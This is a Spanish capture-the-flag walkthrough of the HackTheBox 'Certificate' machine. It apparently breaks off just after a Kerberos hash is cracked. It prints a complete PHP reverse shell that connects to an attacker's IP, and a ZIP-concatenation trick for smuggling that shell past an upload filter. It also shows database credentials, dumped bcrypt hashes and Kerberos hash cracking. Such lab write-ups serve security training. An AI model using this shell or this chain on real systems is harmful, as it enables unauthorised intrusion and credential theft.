---
icon: flag
---

# Certificate HackTheBox (Hard)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-16 11:43 PDT
Nmap scan report for 10.10.11.71
Host is up (0.029s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
|_http-title: Did not follow redirect to http://certificate.htb/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-16 18:44:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-16T18:46:04+00:00; +1m23s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-16T18:46:04+00:00; +1m23s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-10-16T18:46:04+00:00; +1m23s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-10-16T18:46:04+00:00; +1m23s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
49734/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-16T18:45:22
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1m21s, deviation: 2s, median: 1m22s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.41 seconds
```

Veremos varios puerto interesantes, pero entre ellos serian el `WinRM`, `LDAP`, `SMB`, etc... Tambien vemos que nos esta mostrando un `dominio` junto con un `DC` en este caso `DC01`, por lo que vamos añadirlos a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del hosts
<IP>              certificate.htb DC01.certificate.htb
```

Lo guardaremos y probaremos a enumerar dicho `dominio` a ver que nos encontramos.

Si intentamos obtener informacion mediante los servidores `DNS` tampoco veremos informacion relevante.

```shell
dig @DC01.certificate.htb ANY certificate.htb
```

Info:

```
; <<>> DiG 9.20.11-4+b1-Debian <<>> @DC01.certificate.htb ANY certificate.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 42766
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;certificate.htb.               IN      ANY

;; ANSWER SECTION:
certificate.htb.        600     IN      A       10.10.11.71
certificate.htb.        3600    IN      NS      dc01.certificate.htb.
certificate.htb.        3600    IN      SOA     dc01.certificate.htb. hostmaster.certificate.htb. 179 900 600 86400 3600
certificate.htb.        600     IN      AAAA    dead:beef::496f:ef40:1c67:59ee

;; ADDITIONAL SECTION:
dc01.certificate.htb.   3600    IN      A       10.10.11.71
dc01.certificate.htb.   3600    IN      AAAA    dead:beef::496f:ef40:1c67:59ee

;; Query time: 28 msec
;; SERVER: 10.10.11.71#53(DC01.certificate.htb) (TCP)
;; WHEN: Thu Oct 16 11:50:13 PDT 2025
;; MSG SIZE  rcvd: 198
```

Por lo que vamos a probar directamente por la `Web` que tiene en el puerto `80` metiendonos en dicho `dominio`:

```
URL = http://certificate.htb/
```

Veremos una pagina normal sin nada aparentemente sospechoso, pero si le damos algunas opciones veremos que funciona por `PHP` esto es bastante interesante, tambien vemos un `login` y `register`, en el cual nos podremos crear una cuenta y posteriormente iniciar sesion con la misma, si nos vamos a cursos y de ahi bajamos un poco, dandole a cualquier curso veremos lo siguiente en la `URL`.

```
URL = http://certificate.htb/course-details.php?id=1
```

Vemos que esta llamando a un parametro con `id`, pero si le damos a `inscribirnos` en dicho curso veremos lo siguiente:

```
URL = http://certificate.htb/course-details.php?id=1&action=enroll
```

Concatena `2` parametros diferentes, ya tenemos varias cosas interesantes por las que investigar mas.

## Evasive ZIP Concatenation

Una vez que nos inscribamos en el curso, si bajamos un poco veremos varias opciones, entre ellas `Watch` y otra interesante `Submit`, dandole a esta ultima veremos en la `URL` esto:

```
URL = http://certificate.htb/upload.php?s_id=5
```

Vemos que hay un `upload.php`, la cosa ya se va poniendo interesante, tambien nos comentan las normas de subida.

```
1. Please select the assignment file you want to upload (the file will be reviewed by the course instructor)
2. We accept only the following file types: .pdf .docx .pptx .xlsx
3. You include the assignment file in .zip archive file to reduce it's size
```

Vemos bastante interesante el que podamos subir un archivo comprimido en `ZIP` podriamos probar a realizar un `bypass` de este mismo metiendo varios archivos concatenados, entre ellos que sean `PDFs` y despues un `PHP`, ya que generalmente las herramientas solo leen el ultimo archivo dentro del comprimido, por lo que dejaremos uno "legal" que sea un `PDF` en la ultima posicion y antes un archivo `PHP` con alguna `reverse shell` o algo parecido.

### Escalate user xamppuser

URL = [Info de la tecnica de Bypass ZIP](https://isc.sans.edu/diary/31426) / [Info2 de la tecnica Bypass ZIP](https://www.fortinet.com/products/fortimail-workspace-security)

> shell.php

```php
<?php
// Copyright (c) 2020 Ivan Šincek
// v2.6
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer = 1024;  // read/write buffer size
    private $clen   = 0;     // command length
    private $error  = false; // stream read/write error
    private $sdump  = true;  // script's dump
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        $os = PHP_OS;
        if (stripos($os, 'LINUX') !== false || stripos($os, 'DARWIN') !== false) {
            $this->os    = 'LINUX';
            $this->shell = '/bin/sh';
        } else if (stripos($os, 'WINDOWS') !== false || stripos($os, 'WINNT') !== false || stripos($os, 'WIN32') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
            // once daemonized, you will actually no longer see the script's dump
        } else if (posix_setsid() < 0) {
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        if ($this->sdump) {
            $data = str_replace('<', '&lt;', $data);
            $data = str_replace('>', '&gt;', $data);
            echo $data;
        }
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set the global error flag
            echo "STRM_ERROR: Cannot read from {$name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set the global error flag
            echo "STRM_ERROR: Cannot write to {$name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $size = fstat($input)['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // so we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");
                    do {
                        $status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('<IP_ATTACKER>', <PORT>);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
```

URL = [GitHub Codigo Shell PHP](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)

Ahora vamos a crear un archivo valido `PDF` con este comando:

```shell
echo "%PDF-1.4" > dummy.pdf
```

Ahora vamos a comprimirlo por separado de esta forma:

```shell
zip pdf.zip dummy.pdf
zip shell.zip shell.php
```

Vamos a concatenar los `ZIPs`:

```shell
cat pdf.zip shell.zip > bypass.zip
```

Antes de hacer nada vamos a ponernos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora este `ZIP` lo subimos a la pagina, una vez echo esto si le damos al boton `HERE` veremos nuestro supuesto `dummy.pdf` en la pagina con un `404`, pero si modificamos ese archivo en la `URL` por el nombre de `shell.php` veremos que funciona.

> Pasar de esto:

```
URL = http://certificate.htb/static/uploads/8ad6b1453a685cd6a629959dcfb5039d/dummy.pdf
```

> Ha esto:

```
URL = http://certificate.htb/static/uploads/8ad6b1453a685cd6a629959dcfb5039d/shell.php
```

Ahora si volvemos donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.14.220] from (UNKNOWN) [10.10.11.71] 59955
SOCKET: Shell has connected! PID: 4468
Microsoft Windows [Version 10.0.17763.6532]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\certificate.htb\static\uploads\7b934ebcf8f621d619bd3a3854aa96fb>whoami
certificate\xamppuser
```

Veremos que ha funcionado, por lo que vamos a investigar un poco a ver que vemos interesante por aqui.

Investigando un poco y vamos listando los recursos de los directorios a medida que vamos llendo para atras, veremos en esta ruta algo interesante, que es donde se aloja la pagina web.

```powershell
dir C:\xampp\htdocs\certificate.htb
```

Info:

```
12/30/2024  03:04 PM    <DIR>          .
12/30/2024  03:04 PM    <DIR>          ..
12/24/2024  01:45 AM             7,179 about.php
12/30/2024  02:50 PM            17,197 blog.php
12/30/2024  03:02 PM             6,560 contacts.php
12/24/2024  07:10 AM            15,381 course-details.php
12/24/2024  01:53 AM             4,632 courses.php
12/23/2024  05:46 AM               549 db.php
12/22/2024  11:07 AM             1,647 feature-area-2.php
12/22/2024  11:22 AM             1,331 feature-area.php
12/22/2024  11:16 AM             2,955 footer.php
12/23/2024  06:13 AM             2,351 header.php
12/24/2024  01:52 AM             9,497 index.php
12/25/2024  02:34 PM             5,908 login.php
12/23/2024  06:14 AM               153 logout.php
12/24/2024  02:27 AM             5,321 popular-courses-area.php
12/25/2024  02:27 PM             8,240 register.php
12/26/2024  02:49 AM    <DIR>          static
12/29/2024  12:26 AM            10,366 upload.php
              16 File(s)         99,267 bytes
               3 Dir(s)   4,355,551,232 bytes free
```

Vemos que hay un archivo llamado `db.php` que suele contener las credenciales de conexion a la `DDBB` de `mysql` en este caso.

## mysql (Windows)

> db.php

```php
<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>
```

Vemos que las credenciales de `mysql` son los siguientes:

```
User: certificate_webapp_user
Pass: cert!f!c@teDBPWD
```

Vamos a conectarnos a dicha `DDBB` con el binario de `mysql` de esta forma:

```powershell
cd C:\xampp\mysql\bin
.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "show databases;"
```

Info:

```
Database
certificate_webapp_db
information_schema
test
```

Veremos varias `DDBBs` interesantes, pero entre ellas una que llama la atencion `certificate_webapp_db`, vamos a ver que contiene.

```powershell
.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db; show tables;"
```

Info:

```
Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses
```

Ahora vamos a ver que contiene la tabla `users`:

```shell
.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db; select * from users;"
```

Info:

```
id      first_name      last_name       username        email   password        created_at      role    is_active
1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10 teacher  1
6       Sara    Laracrof        Sara1200        sara1200@gmail.com      $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK    2024-12-23 12:47:11 teacher  1
7       John    Wood    Johney  johny009@mail.com       $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq    2024-12-23 13:18:18     student 1
8       Havok   Watterson       havokww havokww@hotmail.com     $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti    2024-12-24 09:08:04     teacher      1
9       Steven  Roman   stev    steven@yahoo.com        $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1
10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1
12      1       2       12      1@2.com $2y$04$enbpf8ICNN968HLfbvrHGu/71q5fMuX2kXqWQCqmLux.qLHS0JsEq    2025-10-17 09:01:34     student 1
13      123     321     123     123@123.com     $2y$04$qKNPREpDOCAf2sDTVQ.g7OHqA0ebNCjaQtNA5LvORZiuIFlf/k3Gq    2025-10-17 09:02:00     student 1
14      test1   1test   test12  test1@lol.com   $2y$04$CNzavjGZrEBBhV0u78ihFOFYF29E0.9CGJ31paHlof5.AfEz.KhnW    2025-10-17 09:02:59     student 1
15      test    test    test    test@test.com   $2y$04$dNz.4QiEQx5uhuK0Hck/qu9zjoY0WTdsvY/tKBaAgvXSUZz.DwdgW    2025-10-17 09:29:05     student 1
16      diseo   diseo   diseo   diseo@test.com  $2y$04$WMHt4YZY8VXm0Mbd7KENwOrM.U/fhj2soqms.5CR7OwFjjem83tiy    2025-10-17 19:59:32     student 1
```

Veremos muy interesante que el unico usuario que es `admin` en la pagina es el usuario `sara.b`, por lo que vamos a probar a `crackear` dicha contraseña.

## Escalate user sara.b

> hash

```
sara.b:$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6
```

Ahora vamos a probar con `john`:

```shell
john --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Blink182         (sara.b)     
1g 0:00:00:00 DONE (2025-10-18 11:11) 1.612g/s 19741p/s 19741c/s 19741C/s monday1..vallejo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado, pero en vez de iniciar sesion en la pagina, vamos a ver si estas credenciales son validas a nivel de sistema.

```shell
netexec smb <IP> -u sara.b -p 'Blink182' --shares
```

Info:

```
SMB         10.10.11.71     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.71     445    DC01             [+] certificate.htb\sara.b:Blink182 
SMB         10.10.11.71     445    DC01             [*] Enumerated shares
SMB         10.10.11.71     445    DC01             Share           Permissions     Remark
SMB         10.10.11.71     445    DC01             -----           -----------     ------
SMB         10.10.11.71     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.71     445    DC01             C$                              Default share
SMB         10.10.11.71     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.71     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.71     445    DC01             SYSVOL          READ            Logon server share
```

Veremos que si funciona, por lo que estas credenciales son validas a nivel de dominio, pero si las probamos directamente a conectarnos por `WinRM`.

### Evil-winrm

```shell
evil-winrm -i <IP> -u sara.b -p Blink182
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Sara.B\Documents> whoami
certificate\sara.b
```

Veremos que ha funcionado por lo que seremos dicho usuario.

## Escalate user lion.sk

Sabiendo que tenemos unas credenciales y que podemos entrar por `WinRM` vamos a descargarnos un `ZIP` que nos sirva para importarlo en la herramienta de `BloodHound` de esta forma.

```shell
bloodhound-python -u sara.b -p 'Blink182' -ns <IP> -d certificate.htb -c All --zip
```

Info:

```
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: certificate.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.certificate.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc01.certificate.htb
INFO: Found 19 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WS-05.certificate.htb
INFO: Querying computer: WS-01.certificate.htb
INFO: Querying computer: DC01.certificate.htb
INFO: Done in 00M 06S
INFO: Compressing output into 20251018111648_bloodhound.zip
```

Vemos que hay `2` subdominios mas los cuales vamos añadir a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>               certificate.htb DC01.certificate.htb WS-05.certificate.htb WS-01.certificate.htb
```

## BloodHound

Ahora vamos a instalar `BloodHound` de forma rapida en un `docker`:

URL = [Download BloodHound en Docker](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

```shell
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install
```

Info:

```
..............................<RESTO DE INFO>......................................
Container bloodhound-graph-db-1  Creating
 Container bloodhound-app-db-1  Creating
 Container bloodhound-graph-db-1  Created
 Container bloodhound-app-db-1  Created
 Container bloodhound-bloodhound-1  Creating
 Container bloodhound-bloodhound-1  Created
 Container bloodhound-app-db-1  Starting
 Container bloodhound-graph-db-1  Starting
 Container bloodhound-app-db-1  Started
 Container bloodhound-graph-db-1  Started
 Container bloodhound-graph-db-1  Waiting
 Container bloodhound-app-db-1  Waiting
 Container bloodhound-graph-db-1  Healthy
 Container bloodhound-app-db-1  Healthy
 Container bloodhound-bloodhound-1  Starting
 Container bloodhound-bloodhound-1  Started
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

Ahora que esta importado en nuestro `docker` y levantado podremos acceder a el desde la siguiente `URL`.

```
URL = http://127.0.0.1:8080/ui/login
```

Nos logueamos con las credenciales propocionadas por la herramienta, entrando nos pedira cambiar las credenciales y ya nos metera dentro:

```
User: admin
Pass: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
```

Una vez dentro vamos a importar el `.zip` y tendremos que esperar un poco a que cargue todos los datos, despues cuando vayamos al `dashboard` principal veremos todos los datos, vamos a investigar el usuario `sara.b` a ver que tiene.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-18 125155.png" alt=""><figcaption></figcaption></figure>

Veremos esto que a simple vista no es nada interesante, por lo que vamos a dejarlo aparcado ahi y seguiremos investigando en las carpetas del usuario a ver que podremos ver.

Si listamos el propio directorio de cuando nos metemos por `evil-winrm` veremos lo siguiente:

```
Directory: C:\Users\Sara.B\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/4/2024  12:53 AM                WS-01
```

Veremos una carpeta llamada `WS-01`, entrando dentro veremos:

```
Directory: C:\Users\Sara.B\Documents\WS-01


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/4/2024  12:44 AM            530 Description.txt
-a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap
```

Un archivo de texto con alguna descripcion y despues algo super interesante un `.pcap` (Una captura de datos de la red en ese momento con `wireshark`).

> Description.txt

```
The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
When a user tries to input bad credentials, it returns bad credentials error.
But when a user provides valid credentials the file explorer freezes and then crashes!
```

Ahora si vemos la captura con `wireshark` del `.pcap` veremos muchisimos datos, pero vamos a filtrar por metodos de `autenticacion` que son los que nos interesa por si hubiera capturado algo de `kerberos5` ya que esta en un `dominio` los `NTLM` no nos interesan.

Antes vamos a descargarnos el archivo:

```shell
download WS-01_PktMon.pcap
```

Info:

```
Info: Downloading C:\Users\Sara.B\Documents\WS-01\WS-01_PktMon.pcap to WS-01_PktMon.pcap
                                        
Info: Download successful!
```

Ahora si filtramos por `kerberos` veremos algunos paquetes:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-18 130056.png" alt=""><figcaption></figcaption></figure>

Aqui vemos claramente en el `cname` del `AS-REP` (Respuesta del servidor) que pertenece dicho `TGT` al usuario `lion.sk`, ahora vamos a ver si esta por ahi su `TGT` para intentar `crackearlo`.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-18 130612.png" alt=""><figcaption></figcaption></figure>

En la parte de `AS-REQ` si nos vamos a la parte de `padata` en los campos de `etype` y `cipher` podremos montarnos nuestro propio `hash` para poder crackearlo con `john` pero tendremos que montar el `hash` de forma correcta quedando algo asi:

```
cipher: 23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```

Cogemos el `salt` super importante:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-18 131012.png" alt=""><figcaption></figcaption></figure>

```
salt: CERTIFICATE.HTBLion.SK
```

El formato de un `hash` `kerberos5` seria la siguiente:

```
$krb5pa$18$<USER>$<DOMAIN>$<SALT>$<CIPHER_HASH>
```

Asi quedaria formado:

> hash.krb5

```
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$CERTIFICATE.HTBLion.SK$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```

Ahora vamos a probar a `crackearlo`.

```shell
john --wordlist=<WORDLIST> hash.krb5
```

Info:

```
Warning: detected hash type "krb5pa-sha1", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Warning: detected hash type "krb5pa-sha1", but the string is also recognized as "HMAC-SHA512"
Use the "--format=HMAC-SHA512" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (krb5pa-sha1, Kerberos 5 AS-REQ Pre-Auth etype 17/18 [PBKDF2-SHA1 128/128 AVX 4x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!QAZ2wsx         (?)     
